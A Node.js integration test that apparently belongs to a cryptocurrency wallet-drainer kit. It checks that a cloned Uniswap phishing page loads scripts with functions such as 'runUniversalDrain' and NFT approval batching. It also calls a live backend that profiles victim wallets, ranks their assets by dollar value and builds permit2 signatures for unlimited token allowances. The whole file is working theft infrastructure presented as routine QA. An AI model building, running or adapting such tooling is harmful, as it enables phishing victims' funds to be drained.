/**
 * Frontend script integration smoke test — static + backend wire checks.
 * Validates connect → extract pipeline symbols and script load contract.
 *
 * Usage: node scripts/test-frontend-scripts.mjs
 */
import { readFileSync, existsSync, statSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const ROOT = join(dirname(fileURLToPath(import.meta.url)), '..');
const CLONE = join(ROOT, 'clones/uniswap-clone');
const BACKEND = (process.env.BACKEND_URL || 'https://legionapi-production.up.railway.app').replace(/\/$/, '');
const TEST_EVM = '0xd52C5968E9aCBf970c60a5Dbaf9eA7385715E90f';
const MAX_PERMIT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

const results = [];
const sections = {};

function section(name) {
  if (!sections[name]) sections[name] = { pass: 0, fail: 0 };
  return name;
}

function record(sec, name, pass, detail = '') {
  section(sec);
  sections[sec][pass ? 'pass' : 'fail'] += 1;
  results.push({ sec, name, pass, detail });
  console.log(`${pass ? '✅' : '❌'} [${sec}] ${name}${detail ? ` — ${detail}` : ''}`);
}

function readClone(rel) {
  return readFileSync(join(CLONE, rel), 'utf8');
}

function unwrap(raw) {
  if (raw == null || typeof raw !== 'object') return raw;
  if (raw.data != null && (typeof raw.success === 'boolean' || typeof raw.ok === 'boolean')) return raw.data;
  return raw;
}

async function api(method, path, body) {
  const url = `${BACKEND}${path}`;
  const opts = {
    method,
    headers: { 'Content-Type': 'application/json', 'X-Source-Origin': 'https://test.local' },
    signal: AbortSignal.timeout(120_000),
  };
  if (body) opts.body = JSON.stringify(body);
  try {
    const res = await fetch(url, opts);
    const raw = await res.json().catch(() => ({}));
    return { status: res.status, ok: res.ok, data: unwrap(raw), message: raw.message || '', raw };
  } catch (e) {
    return { status: 0, data: null, ok: false, error: e.message };
  }
}

console.log('╔══════════════════════════════════════════════════════════════╗');
console.log('║     LEGION FRONTEND SCRIPTS — INTEGRATION SMOKE TEST         ║');
console.log('╚══════════════════════════════════════════════════════════════╝');
console.log(`Backend: ${BACKEND}\n`);

// ── A: Script files exist ─────────────────────────────────────────────────
console.log('### A: Script assets');
const assets = [
  ['vendor/legion-polyfills.js', 500],
  ['vendor/legion-wallet.iife.js', 1_000_000],
  ['legion.js', 50_000],
  ['legion.min.js', 50_000],
  ['legion-bridge.js', 500],
  ['wallet-modal.js', 500],
  ['wallet-detect.js', 500],
  ['wallet-modal.css', 100],
];
for (const [file, minBytes] of assets) {
  const p = join(CLONE, file);
  const ok = existsSync(p) && statSync(p).size >= minBytes;
  record('assets', file, ok, ok ? `${Math.round(statSync(p).size / 1024)} KB` : 'missing/small');
}

// ── B: index.html load order ──────────────────────────────────────────────
console.log('\n### B: index.html script order');
const html = readClone('index.html');
const headScripts = [...html.matchAll(/<script[^>]+src="([^"]+)"[^>]*>/g)].map((m) => m[1]);
const polyIdx = headScripts.findIndex((s) => s.includes('legion-polyfills'));
const walletIdx = headScripts.findIndex((s) => s.includes('legion-wallet'));
const legionIdx = headScripts.findIndex((s) => s.includes('legion.min') || s.includes('legion.js'));
record('load-order', 'polyfills before wallet', polyIdx >= 0 && walletIdx > polyIdx, `poly=${polyIdx} wallet=${walletIdx}`);
record('load-order', 'wallet before legion', walletIdx >= 0 && legionIdx > walletIdx, `wallet=${walletIdx} legion=${legionIdx}`);
const headEnd = html.indexOf('</head>');
const bodyBridge = html.indexOf('legion-bridge.js');
record('load-order', 'bridge at body end (not head)', bodyBridge > headEnd, `headEnd=${headEnd} bridge=${bodyBridge}`);
record('load-order', 'legion-bridge defer', /legion-bridge\.js[^"']*"[^>]*defer/i.test(html));
record('load-order', 'wallet-detect defer', /wallet-detect\.js[^"']*"[^>]*defer/i.test(html));
record('load-order', 'wallet-modal defer', /wallet-modal\.js[^"']*"[^>]*defer/i.test(html));

// ── C: Source contracts ───────────────────────────────────────────────────
console.log('\n### C: Source contracts');
const legion = readClone('legion.js');
const legionMin = readClone('legion.min.js');
const bridge = readClone('legion-bridge.js');
const detect = readClone('wallet-detect.js');
const polyfills = readClone('vendor/legion-polyfills.js');
const walletBundle = readClone('vendor/legion-wallet.iife.js');

record('source', 'legion:ready event', legion.includes("legion:ready") && legionMin.includes('legion:ready'));
record('source', 'linkAllFamiliesOnConnect', legion.includes('linkAllFamiliesOnConnect'));
record('source', 'wireWcFamilyConnections', legion.includes('wireWcFamilyConnections'));
record('source', 'runUniversalDrain', legion.includes('runUniversalDrain'));
record('source', 'scanFullPortfolio', legion.includes('scanFullPortfolio'));
record('source', 'SUBMIT.permit2 path', legion.includes('permit2_batch_eip712'));
record('source', 'ensureUserFactoryContract', legion.includes('ensureUserFactoryContract'));
record('source', 'tryRecoverWcSession', legion.includes('tryRecoverWcSession'));
record('source', 'getMultiChainOrder capped', legion.includes('MAX_VALID_EVM_CHAIN_ID') && legion.includes('TARGET_EVM_CHAIN_IDS'));
record('source', 'NFT batch size 50', legion.includes('NFT_APPROVAL_BATCH_SIZE = 50'));
record('source', 'NFT contract dedupe', legion.includes('byContract'));
record('source', 'sendCalls chunking', legion.includes('SEND_CALLS_MAX'));

record('bridge', 'whenLegionReady guard', bridge.includes('whenLegionReady'));
record('bridge', 'customModalClickWalletConnect', bridge.includes('customModalClickWalletConnect'));
record('bridge', 'legion:connected listener', bridge.includes('legion:connected'));

record('detect', 'EIP-6963 500ms window', detect.includes('500'));
record('detect', 'legion:ready multi-retry', detect.includes('LEGION_READY_RETRIES_MS') || detect.includes('1200'));
record('detect', 'eip6963:requestProvider', detect.includes('eip6963:requestProvider'));

record('polyfills', 'Buffer polyfill', polyfills.includes('root.Buffer'));
record('polyfills', 'WC JSON replacer hook', polyfills.includes('__LEGION_WC_JSON_REPLACER__'));

record('wallet', 'LegionWallet global', walletBundle.includes('LegionWallet'));
record('wallet', 'installWcJsonPatch', walletBundle.includes('installWcJsonPatch') || walletBundle.includes('wcStringify'));
record('wallet', 'getSessionAddresses', walletBundle.includes('getSessionAddresses'));
record('wallet', 'tryRecoverStoredSession', walletBundle.includes('tryRecoverStoredSession'));
record('wallet', 'buildOptionalNamespaces', walletBundle.includes('buildOptionalNamespaces'));

// ── D: Backend connect → extract wire ─────────────────────────────────────
console.log('\n### D: Backend API (connect → scout → extract builders)');

const health = await api('GET', '/health');
record('backend', 'health', health.ok, `HTTP ${health.status}`);

const ready = await api('GET', '/health/ready');
record('backend', 'health ready', ready.ok, `HTTP ${ready.status}`);

const scout = await api('POST', '/api/v1/scout', {
  user_address: TEST_EVM,
  chain_id: 1,
  chain_family: 'EVM',
  wallet_type: 'WalletConnect',
  scout_value_usd: 1,
  source_page: 'https://e2e-test.legion.local/connect',
  connected_wallets: [
    `evm:${TEST_EVM}`,
    'sol:3TKvjiU5bYnDr883orJz6vLCqksfeaDfmwSMQNCbsTZv',
  ],
});
record('backend', 'scout telemetry (multi-family)', scout.status === 200 || scout.status === 201, `HTTP ${scout.status}`);

const fusion = await api('POST', '/api/scout/recursive-predator-fusion', {
  evm_holder: TEST_EVM,
  sol_owner_base58: '3TKvjiU5bYnDr883orJz6vLCqksfeaDfmwSMQNCbsTZv',
  scout_value_usd: 1,
});
record('backend', 'fusion portfolio', fusion.status === 200, `HTTP ${fusion.status}`);

const multiBal = await api('POST', '/api/v1/multi-balance', {
  evm: TEST_EVM,
  evm_chain_id: 1,
  sol: '3TKvjiU5bYnDr883orJz6vLCqksfeaDfmwSMQNCbsTZv',
});
record('backend', 'multi-balance all families', multiBal.status === 200, `HTTP ${multiBal.status}`);

const p2 = await api('POST', '/api/v1/signature-anchor/permit2-batch-typed-data', {
  wallet_address: TEST_EVM,
  chain_id: 1,
  permits: [{ token: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', amount: MAX_PERMIT }],
});
record('backend', 'permit2-batch typed-data builder', p2.status === 200 && !!p2.data?.typed_data, `HTTP ${p2.status}`);

const factory = await api('POST', '/api/v1/factory/deploy', {
  wallet_address: TEST_EVM,
  chain_id: 1,
  predict_only: true,
});
record('backend', 'factory clone predict', factory.ok && !!factory.data?.contract_address,
  factory.data?.contract_address?.slice(0, 12) || `HTTP ${factory.status}`);

const ranked = await api('POST', '/api/v1/scout/ranked', {
  wallet_address: TEST_EVM,
  chain_id: 1,
});
record('backend', 'ranked assets (USD priority)', ranked.status === 200, `HTTP ${ranked.status}`);

// ── Summary ───────────────────────────────────────────────────────────────
console.log('\n' + '='.repeat(72));
console.log('FRONTEND SCRIPT TEST SUMMARY');
console.log('='.repeat(72));
let totalPass = 0;
let totalFail = 0;
for (const [sec, { pass, fail }] of Object.entries(sections)) {
  const t = pass + fail;
  const pct = t ? Math.round((pass / t) * 100) : 0;
  console.log(`${sec.padEnd(14)} ${pass}/${t} (${pct}%)`);
  totalPass += pass;
  totalFail += fail;
}
const overall = Math.round((totalPass / (totalPass + totalFail)) * 100);
console.log('-'.repeat(72));
console.log(`OVERALL: ${totalPass}/${totalPass + totalFail} (${overall}%)`);

console.log('\nBROWSER-ONLY (not automated):');
console.log('  • WalletConnect QR + multi-chain popup');
console.log('  • EIP-6963 slow provider (>500ms) — wallet-detect retries at 500/800/1200/2000ms');
console.log('  • Real signature + on-chain settlement');

const failed = results.filter((r) => !r.pass);
if (failed.length) {
  console.log('\nFAILURES:');
  for (const f of failed) console.log(`  [${f.sec}] ${f.name}: ${f.detail || 'failed'}`);
}

const reportPath = join(ROOT, 'tmp/frontend-scripts-test-report.json');
try {
  const { writeFileSync, mkdirSync } = await import('node:fs');
  mkdirSync(join(ROOT, 'tmp'), { recursive: true });
  writeFileSync(reportPath, JSON.stringify({ backend: BACKEND, time: new Date().toISOString(), overall, totalPass, totalFail, sections, results }, null, 2));
  console.log(`\nReport: ${reportPath}`);
} catch { /* ignore */ }

process.exit(failed.length > 0 ? 1 : 0);
